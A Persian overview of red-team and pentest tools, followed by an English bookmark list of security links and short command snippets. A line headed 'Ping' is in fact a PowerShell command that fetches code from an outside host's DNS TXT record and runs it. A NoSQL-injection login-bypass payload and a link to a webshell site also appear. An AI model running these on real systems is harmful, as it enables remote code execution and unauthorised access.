# ابزارهای Red Teaming و تست نفوذ

این مستند شامل ابزارهایی است که تیم‌های **Red Team** برای شبیه‌سازی حملات و شناسایی آسیب‌پذیری‌ها در سیستم‌ها، شبکه‌ها و وب‌سایت‌ها استفاده می‌کنند. در ادامه توضیحات، ویژگی‌ها و نحوه استفاده از این ابزارها آمده است.

---

## 1. Metasploit Framework

### توضیحات:
Metasploit یکی از قدرتمندترین فریم‌ورک‌ها برای تست نفوذ و شبیه‌سازی حملات است. این ابزار به تیم‌های Red Team کمک می‌کند تا از **Exploit**های موجود برای بهره‌برداری از آسیب‌پذیری‌ها در سیستم‌ها استفاده کنند.

### ویژگی‌ها:
- شامل هزاران exploit برای آسیب‌پذیری‌های شناخته‌شده
- ابزارهای کمکی مانند **payload**، **post-exploitation**، و **reporting**
- توانایی نوشتن و پیاده‌سازی exploitهای جدید

### استفاده:
- برای حملات **Remote Code Execution (RCE)**، **Privilege Escalation** و **Web Application Attacks** استفاده می‌شود.

---

## 2. Nmap

### توضیحات:
Nmap (Network Mapper) ابزاری برای اسکن و کشف شبکه است. این ابزار در جمع‌آوری اطلاعات اولیه از شبکه و شناسایی پورت‌های باز و سرویس‌های فعال بسیار مفید است.

### ویژگی‌ها:
- شناسایی پورت‌های باز و سرویس‌های در حال اجرا بر روی هر IP
- تشخیص نسخه نرم‌افزار و سیستم‌عامل با استفاده از **OS Detection**
- اسکن برای آسیب‌پذیری‌ها و بررسی شبکه‌های مجازی

### استفاده:
- برای شناسایی سرویس‌ها، سیستم‌عامل‌ها و وضعیت امنیتی سیستم‌های موجود در یک شبکه استفاده می‌شود.

---

## 3. Burp Suite

### توضیحات:
Burp Suite ابزاری است برای تست امنیت وب‌سایت‌ها که از آن برای کشف آسیب‌پذیری‌هایی مثل **XSS** (Cross-site Scripting)، **SQL Injection** و **Command Injection** استفاده می‌شود.

### ویژگی‌ها:
- شبیه‌سازی حملات بر روی برنامه‌های وب
- قابلیت **intercepting** (مانند MITM)
- **Scanner** برای شناسایی آسیب‌پذیری‌های رایج وب
- قابلیت توسعه با استفاده از پلاگین‌ها

### استفاده:
- برای تست آسیب‌پذیری‌های **Web Applications** و شبیه‌سازی حملات **Man-in-the-Middle (MITM)** و **Injection Attacks** بسیار کاربردی است.

---

## 4. Cobalt Strike

### توضیحات:
Cobalt Strike یک ابزار شبیه‌سازی حمله بسیار پیشرفته است که به‌طور خاص برای **Red Teaming** طراحی شده است. این ابزار از قابلیت‌های متعددی برای حملات **post-exploitation**، **lateral movement** و **pivoting** برخوردار است.

### ویژگی‌ها:
- توانایی تست نفوذ و شبیه‌سازی حملات پیشرفته
- ارائه **beacons** برای برقراری ارتباط با سیستم‌های تحت نفوذ
- **Remote Access** و **Privilege Escalation**
- امکانات گسترده برای **social engineering**

### استفاده:
- برای حملات پیچیده مانند **spear-phishing**، **webshell** و **backdoor access** به سیستم‌ها استفاده می‌شود.

---

## 5. Wireshark

### توضیحات:
Wireshark یک **sniffer** شبکه است که به تیم‌های Red Team کمک می‌کند تا بسته‌های شبکه را ضبط کرده و تجزیه و تحلیل کنند. این ابزار می‌تواند به شبیه‌سازی حملات مانند **Man-in-the-Middle (MITM)** و **sniffing passwords** کمک کند.

### ویژگی‌ها:
- ضبط بسته‌ها از شبکه
- تجزیه و تحلیل پروتکل‌های مختلف
- بررسی **TCP/IP** و دیگر پروتکل‌های شبکه
- تجزیه و تحلیل حملات **MITM**

### استفاده:
- برای شبیه‌سازی حملات **sniffing** و بررسی ترافیک شبکه و کشف اطلاعات حساس مانند **passwords**، **cookies** و **session tokens** استفاده می‌شود.

---

## 6. Nessus

### توضیحات:
Nessus یک اسکنر آسیب‌پذیری است که می‌تواند به سرعت سیستم‌ها و شبکه‌ها را اسکن کرده و آسیب‌پذیری‌های شناخته‌شده را شناسایی کند. این ابزار در **pre-attack phase** بسیار مفید است.

### ویژگی‌ها:
- اسکن آسیب‌پذیری‌های عمومی و پیکربندی ضعیف
- پایگاه داده **CVE** (Common Vulnerabilities and Exposures) برای شناسایی آسیب‌پذیری‌ها
- مستندسازی آسیب‌پذیری‌ها و ارائه راهکار

### استفاده:
- برای انجام **vulnerability scanning** و شناسایی آسیب‌پذیری‌های موجود در نرم‌افزارها و سیستم‌های تحت تست استفاده می‌شود.

---

## 7. BloodHound

### توضیحات:
BloodHound ابزاری برای شبیه‌سازی حملات **Active Directory** است. این ابزار به تیم‌های Red کمک می‌کند تا جهت حرکت جانبی (**Lateral Movement**) و **Privilege Escalation** را شبیه‌سازی کنند.

### ویژگی‌ها:
- شبیه‌سازی حملات به **Active Directory** و **permission escalation**
- قابلیت **mapping** ساختار **Active Directory**
- شناسایی و سوءاستفاده از **misconfigurations** در **Active Directory**

### استفاده:
- برای شبیه‌سازی حملات داخلی به **Windows Active Directory** و شناسایی مسیرهای حمله برای **privilege escalation** استفاده می‌شود.

---

## 8. John the Ripper

### توضیحات:
John the Ripper یکی از مشهورترین ابزارهای کرک پسورد است که برای شبیه‌سازی حملات **Brute Force** و **Dictionary Attack** استفاده می‌شود.

### ویژگی‌ها:
- کرک کردن پسوردهای مختلف با استفاده از حملات **Brute Force** و **Dictionary**
- پشتیبانی از انواع الگوریتم‌های هش مانند **MD5**، **SHA**، **LM** و **NTLM**
- قابلیت **distributed cracking** برای کرک پسوردها به‌صورت موازی

### استفاده:
- برای شبیه‌سازی حملات به پسوردهای کاربران در سیستم‌ها و شبکه‌های مختلف استفاده می‌شود.

---

## 9. Hydra

### توضیحات:
Hydra یک ابزار **brute force** برای حملات به سرویس‌های مختلف مانند **SSH**، **FTP**، **HTTP**، **RDP** و غیره است.

### ویژگی‌ها:
- قابلیت اجرای attacks بر روی بیش از 50 پروتکل مختلف
- پشتیبانی از **dictionary attacks** و **brute-force** حملات
- امکان تعیین تعداد تلاش‌ها و تنظیمات سفارشی

### استفاده:
- از Hydra برای انجام حملات **brute-force** به سیستم‌ها و سرویس‌های مختلف برای کشف رمز عبورهای ضعیف استفاده می‌شود.

---

## 10. Social-Engineer Toolkit (SET)

### توضیحات:
SET یک ابزار فوق‌العاده برای **مهندسی اجتماعی** است که به تیم‌های Red کمک می‌کند حملات **فیشینگ** و **مهندسی اجتماعی** را شبیه‌سازی کنند.

### ویژگی‌ها:
- پشتیبانی از حملات **phishing** و **spear-phishing**
- قابلیت ساخت **payload**های فیشینگ
- ابزارهای پیشرفته برای مهاجمتان به هدف‌ها با استفاده از تکنیک‌های مهندسی اجتماعی

### استفاده:
- از SET برای شبیه‌سازی حملات مهندسی اجتماعی مانند **فیشینگ**، ایجاد صفحات تقلبی و بهره‌برداری از خطای انسانی استفاده می‌شود.

---

## 11. Fuff (Fuzzing و Discovery Tool)

### توضیحات:
Fuff یکی از ابزارهای محبوب در دنیای امنیت است که به ویژه برای **Directory Bruteforce** و **Fuzzing** در **Web Applications** طراحی شده است. این ابزار برای شبیه‌سازی حملات بر روی URL‌ها و مسیرهای URL استفاده می‌شود.

### ویژگی‌ها:
- پشتیبانی از پروتکل **HTTP/HTTPS**
- عملکرد سریع و کارآمد
- پشتیبانی از **wordlist**های بزرگ
- پشتیبانی از فیلترهای پیشرفته
- پشتیبانی از **DNS** و **TCP**

### استفاده‌ها:
- برای **bruteforce** کردن مسیرها و دایرکتوری‌ها در یک وب‌سایت
- شبیه‌سازی حملات **fuzzing** برای یافتن نقاط آسیب‌پذیر
- شبیه‌سازی حملات **path traversal** برای پیدا کردن فایل‌های حساس

---

## 12. ابزارهای Fuzzing

Fuzzing یک تکنیک تست امنیت است که برای یافتن آسیب‌پذیری‌ها در نرم‌افزارها و سیستم‌ها استفاده می‌شود. این ابزارها با ارسال ورودی‌های تصادفی و نادرست به سیستم، نقاط ضعف و رفتارهای غیرمنتظره سیستم را شبیه‌سازی می‌کنند.

### ابزارهای محبوب Fuzzing:
- **AFL (American Fuzzy Lop)**: به طور خودکار ورودی‌های تصادفی تولید می‌کند.
- **Burp Suite Intruder**: برای شبیه‌سازی حملات **SQL Injection**، **XSS**، **Command Injection** و دیگر آسیب‌پذیری‌های وب.
- **Peach Fuzzer**: برای تست آسیب‌پذیری‌های پروتکل‌ها و پروژه‌های نرم‌افزاری.
- **OWASP ZAP**: ابزار fuzzer برای **web applications**.

---

## 13. ابزارهای Deep Scanning (اسکن عمیق)

ابزارهای **deep scanning** بیشتر به شبیه‌سازی حملات پیچیده‌تر و شناسایی آسیب‌پذیری‌های پنهان در سیستم‌ها و وب‌سایت‌ها کمک می‌کنند.

### ابزارهای Deep Scanning:
- **Nikto**: اسکنر وب برای شناسایی آسیب‌پذیری‌های رایج.
- **Dirbuster**: ابزار brute-forcing برای دایرکتوری‌ها و مسیرهای وب.
- **Amass**: ابزار OSINT برای کشف زیرساخت‌های شبکه و میزبان‌ها.

---

با این ساختار می‌توانید راحت‌تر ابزارها و روش‌های مورد استفاده در تیم‌های Red Team را مدیریت و پیاده‌سازی کنید.


# ac-bookmark
Free Tools and Source For Security Pentest .. 😎

```sh
https://github.com/jpillora/chisel
https://github.com/samratashok/nishang
https://github.com/411Hall/JAWS
https://github.com/unicorn-engine/unicorn
https://github.com/ropnop/kerbrute
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/cyberheartmi9/Frida-Guide/blob/main/Frida%20Guide/Frida%20Guide.md
https://www.r57shell.net
https://wiki.96.mk/
https://ninite.com/
https://vulners.com
https://crt.sh
https://grep.app
https://github.com/Live-Hack-CVE
https://search.censys.io/
https://crt.sh/json?q=domainname
https://vulmon.com/
https://www.tarlogic.com/blog/
https://www.blazeinfosec.com/
https://www.ired.team/
```

### Command FUZZIng Check extension in request
```sh
ffuf -request 'file.req' -request-proto hhtp or https -w 'List extensions fuzzing' -ms 'size header+body'
```

### Ping 

```sh
powershell . (nslookup -q=txt mrmtwoj.ir)[-1]
```

### BYPass Sql inkect and json 
```sh
{"username":"admin","password":{"$ne":""}}
```

```python
Scaling Network Scanning
https://github.com/natlas/natlas
https://alternativeto.net/software/natlas/about/
```
### RED TEAM IK

theHarvester is a simple to use, yet powerful tool designed to be used during the reconnaissance stage of a red
team assessment or penetration test. It performs open source intelligence (OSINT) gathering to help determine
a domain's external threat landscape. The tool gathers names, emails, IPs, subdomains, and URLs by using
multiple public resources that include:

```sh
https://github.com/laramies/theHarvester
```

Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS.

```sh
https://github.com/aboul3la/Sublist3r
```


Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.

```sh
https://github.com/lanmaster53/recon-ng
```

SpiderFoot is an open source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.

```sh
https://github.com/smicallef/spiderfoot
```

The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
```sh
https://github.com/owasp-amass/amass
```


